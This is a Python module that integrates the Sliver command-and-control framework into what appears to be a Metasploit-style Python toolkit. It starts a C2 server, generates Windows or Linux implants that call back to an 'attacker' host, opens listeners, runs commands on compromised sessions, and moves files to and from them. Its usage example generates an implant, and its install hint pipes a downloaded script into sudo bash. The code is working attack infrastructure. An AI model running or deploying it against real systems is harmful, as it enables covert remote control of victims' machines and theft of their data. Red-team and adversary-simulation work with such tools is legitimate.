#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Sliver C2 Integration for Metasploit PyNative

Sliver is a modern, open-source C2 framework written in Go that provides
advanced features for red team operations and adversary simulations.

Author: P4x-ng
License: MSF_LICENSE
"""

import logging
import subprocess
import os
import sys
import time
import json
import socket
from pathlib import Path

from lib.msf.core.integrations import BaseIntegration, IntegrationRegistry


class SliverIntegration(BaseIntegration):
    """
    Integration for Sliver C2 Framework.
    
    Features:
    - Dynamic code generation (Go, C#, shellcode, etc.)
    - Secure C2 over mTLS, WireGuard, HTTP(S), DNS
    - Process injection and migration
    - In-memory .NET assembly execution
    - Windows token manipulation
    - Tunneling and port forwarding
    - Session multiplexing
    - Anti-forensics features
    """
    
    def __init__(self, config=None):
        super().__init__(config)
        self.name = "sliver"
        self.server_process = None
        self.client_process = None
        self.server_host = None
        self.server_port = None
        
    def check_dependencies(self):
        """Check if Sliver is installed."""
        try:
            # Check for sliver-server
            result = subprocess.run(
                ['sliver-server', 'version'],
                capture_output=True,
                text=True,
                timeout=5
            )
            if result.returncode == 0:
                version = result.stdout.strip()
                logging.info(f"Found Sliver: {version}")
                return (True, [])
            else:
                return (False, ['Sliver not working properly'])
        except FileNotFoundError:
            return (False, [
                'Sliver not installed.',
                'Install from: https://github.com/BishopFox/sliver',
                'Quick install: curl https://sliver.sh/install | sudo bash'
            ])
        except subprocess.TimeoutExpired:
            return (False, ['Sliver version check timeout'])
        except Exception as e:
            return (False, [f'Error checking Sliver: {str(e)}'])
    
    def initialize(self):
        """Initialize Sliver integration."""
        try:
            # Check dependencies
            success, missing = self.check_dependencies()
            if not success:
                logging.error(f"Missing dependencies: {missing}")
                return False
            
            self.enabled = True
            logging.info("Sliver integration initialized")
            return True
            
        except Exception as e:
            logging.error(f"Failed to initialize Sliver: {str(e)}")
            return False
    
    def execute(self, command, **kwargs):
        """
        Execute Sliver commands.
        
        Commands:
        - start_server: Start Sliver server
        - stop_server: Stop Sliver server
        - generate: Generate implant
        - start_listener: Start C2 listener
        - list_sessions: List active sessions
        - interact: Interact with session
        - execute: Execute command on session
        - upload: Upload file
        - download: Download file
        - inject: Process injection
        - migrate: Process migration
        """
        if command == 'start_server':
            return self._start_server(**kwargs)
        elif command == 'stop_server':
            return self._stop_server(**kwargs)
        elif command == 'generate':
            return self._generate_implant(**kwargs)
        elif command == 'start_listener':
            return self._start_listener(**kwargs)
        elif command == 'list_sessions':
            return self._list_sessions(**kwargs)
        elif command == 'execute':
            return self._execute_command(**kwargs)
        elif command == 'upload':
            return self._upload(**kwargs)
        elif command == 'download':
            return self._download(**kwargs)
        else:
            return {'success': False, 'error': f'Unknown command: {command}'}
    
    def _start_server(self, daemon=True, **kwargs):
        """
        Start Sliver C2 server.
        
        Args:
            daemon: Run as daemon
        """
        try:
            cmd = ['sliver-server']
            
            if daemon:
                cmd.append('daemon')
            
            logging.info("Starting Sliver server")
            logging.info(f"Command: {' '.join(cmd)}")
            
            self.server_process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )
            
            # Give it time to start
            time.sleep(3)
            
            if self.server_process.poll() is not None:
                stdout, stderr = self.server_process.communicate()
                return {
                    'success': False,
                    'error': f'Sliver server failed to start: {stderr}'
                }
            
            return {
                'success': True,
                'pid': self.server_process.pid,
                'message': 'Sliver server started'
            }
            
        except Exception as e:
            logging.error(f"Failed to start server: {str(e)}")
            return {'success': False, 'error': str(e)}
    
    def _stop_server(self, **kwargs):
        """Stop Sliver server."""
        try:
            if self.server_process and self.server_process.poll() is None:
                logging.info("Stopping Sliver server")
                self.server_process.terminate()
                try:
                    self.server_process.wait(timeout=5)
                except subprocess.TimeoutExpired:
                    logging.warning("Force killing Sliver server")
                    self.server_process.kill()
                
                return {
                    'success': True,
                    'message': 'Sliver server stopped'
                }
            else:
                return {
                    'success': False,
                    'error': 'Sliver server not running'
                }
                
        except Exception as e:
            logging.error(f"Failed to stop server: {str(e)}")
            return {'success': False, 'error': str(e)}
    
    def _generate_implant(self, os='windows', arch='amd64', format='exe',
                         mtls_host=None, mtls_port=8888,
                         http_host=None, http_port=80,
                         output=None, **kwargs):
        """
        Generate Sliver implant.
        
        Args:
            os: Target OS (windows, linux, macos)
            arch: Architecture (amd64, 386, arm, arm64)
            format: Output format (exe, shared, shellcode, service)
            mtls_host: mTLS callback host
            mtls_port: mTLS callback port
            http_host: HTTP(S) callback host
            http_port: HTTP(S) callback port
            output: Output file path
        """
        try:
            cmd = [
                'sliver-client',
                '-c', 'generate'
            ]
            
            # Build generate command
            generate_cmd = f"--os {os} --arch {arch} --format {format}"
            
            if mtls_host:
                generate_cmd += f" --mtls {mtls_host}:{mtls_port}"
            elif http_host:
                generate_cmd += f" --http {http_host}:{http_port}"
            else:
                return {
                    'success': False,
                    'error': 'Must specify either mtls_host or http_host'
                }
            
            if output:
                generate_cmd += f" --save {output}"
            
            logging.info(f"Generating Sliver implant: {generate_cmd}")
            
            result = subprocess.run(
                cmd + [generate_cmd],
                capture_output=True,
                text=True,
                timeout=60
            )
            
            if result.returncode == 0:
                return {
                    'success': True,
                    'os': os,
                    'arch': arch,
                    'format': format,
                    'output': output,
                    'message': f'Implant generated: {output if output else "console output"}',
                    'stdout': result.stdout
                }
            else:
                return {
                    'success': False,
                    'error': result.stderr
                }
                
        except Exception as e:
            logging.error(f"Failed to generate implant: {str(e)}")
            return {'success': False, 'error': str(e)}
    
    def _start_listener(self, protocol='mtls', host='0.0.0.0', port=8888,
                       persistent=True, **kwargs):
        """
        Start Sliver C2 listener.
        
        Args:
            protocol: Listener protocol (mtls, wg, http, https, dns)
            host: Listener host
            port: Listener port
            persistent: Make listener persistent
        """
        try:
            cmd = ['sliver-client', '-c']
            
            listener_cmd = f"{protocol} --lhost {host} --lport {port}"
            if persistent:
                listener_cmd += " --persistent"
            
            logging.info(f"Starting listener: {listener_cmd}")
            
            result = subprocess.run(
                cmd + [listener_cmd],
                capture_output=True,
                text=True,
                timeout=30
            )
            
            if result.returncode == 0:
                return {
                    'success': True,
                    'protocol': protocol,
                    'host': host,
                    'port': port,
                    'persistent': persistent,
                    'message': f'{protocol.upper()} listener started on {host}:{port}',
                    'stdout': result.stdout
                }
            else:
                return {
                    'success': False,
                    'error': result.stderr
                }
                
        except Exception as e:
            logging.error(f"Failed to start listener: {str(e)}")
            return {'success': False, 'error': str(e)}
    
    def _list_sessions(self, **kwargs):
        """List active Sliver sessions."""
        try:
            result = subprocess.run(
                ['sliver-client', '-c', 'sessions'],
                capture_output=True,
                text=True,
                timeout=10
            )
            
            if result.returncode == 0:
                return {
                    'success': True,
                    'sessions': result.stdout,
                    'message': 'Sessions listed'
                }
            else:
                return {
                    'success': False,
                    'error': result.stderr
                }
                
        except Exception as e:
            logging.error(f"Failed to list sessions: {str(e)}")
            return {'success': False, 'error': str(e)}
    
    def _execute_command(self, session_id, command, **kwargs):
        """Execute command on Sliver session."""
        try:
            cmd = [
                'sliver-client',
                '-c',
                f'use {session_id}; {command}'
            ]
            
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=30
            )
            
            return {
                'success': result.returncode == 0,
                'session_id': session_id,
                'command': command,
                'output': result.stdout,
                'error': result.stderr if result.returncode != 0 else None
            }
            
        except Exception as e:
            logging.error(f"Failed to execute command: {str(e)}")
            return {'success': False, 'error': str(e)}
    
    def _upload(self, session_id, local_path, remote_path, **kwargs):
        """Upload file to Sliver session."""
        try:
            cmd = [
                'sliver-client',
                '-c',
                f'use {session_id}; upload {local_path} {remote_path}'
            ]
            
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=60
            )
            
            return {
                'success': result.returncode == 0,
                'session_id': session_id,
                'local_path': local_path,
                'remote_path': remote_path,
                'output': result.stdout,
                'error': result.stderr if result.returncode != 0 else None
            }
            
        except Exception as e:
            logging.error(f"Upload failed: {str(e)}")
            return {'success': False, 'error': str(e)}
    
    def _download(self, session_id, remote_path, local_path, **kwargs):
        """Download file from Sliver session."""
        try:
            cmd = [
                'sliver-client',
                '-c',
                f'use {session_id}; download {remote_path} {local_path}'
            ]
            
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=60
            )
            
            return {
                'success': result.returncode == 0,
                'session_id': session_id,
                'remote_path': remote_path,
                'local_path': local_path,
                'output': result.stdout,
                'error': result.stderr if result.returncode != 0 else None
            }
            
        except Exception as e:
            logging.error(f"Download failed: {str(e)}")
            return {'success': False, 'error': str(e)}
    
    def cleanup(self):
        """Clean up Sliver resources."""
        try:
            # Stop server if running
            if self.server_process and self.server_process.poll() is None:
                logging.info("Terminating Sliver server")
                self.server_process.terminate()
                try:
                    self.server_process.wait(timeout=5)
                except subprocess.TimeoutExpired:
                    logging.warning("Force killing Sliver server")
                    self.server_process.kill()
            
            self.enabled = False
            logging.info("Sliver cleaned up")
            
        except Exception as e:
            logging.error(f"Cleanup error: {str(e)}")


# Register the integration
IntegrationRegistry.register('sliver', SliverIntegration)


if __name__ == '__main__':
    # Test the integration
    logging.basicConfig(level=logging.INFO)
    
    print("=== Sliver C2 Integration Test ===")
    
    sliver = SliverIntegration()
    
    # Check dependencies
    success, missing = sliver.check_dependencies()
    print(f"Dependencies: {'OK' if success else 'MISSING'}")
    if not success:
        print(f"Missing: {missing}")
        for msg in missing:
            print(f"  {msg}")
        sys.exit(1)
    
    # Initialize
    if sliver.initialize():
        print("Initialized: OK")
        
        print("\nTo start Sliver server:")
        print("  result = sliver.execute('start_server')")
        
        print("\nTo generate implant:")
        print("  result = sliver.execute('generate', os='windows', mtls_host='attacker', output='implant.exe')")
        
        print("\nTo start listener:")
        print("  result = sliver.execute('start_listener', protocol='mtls', port=8888)")
        
        print("\nFeatures:")
        print("  - Dynamic code generation (Go, C#, shellcode)")
        print("  - Secure C2 (mTLS, WireGuard, HTTP(S), DNS)")
        print("  - Process injection and migration")
        print("  - In-memory .NET assembly execution")
        print("  - Windows token manipulation")
        print("  - Tunneling and port forwarding")
        print("  - Anti-forensics capabilities")
        
        sliver.cleanup()
    else:
        print("Failed to initialize")
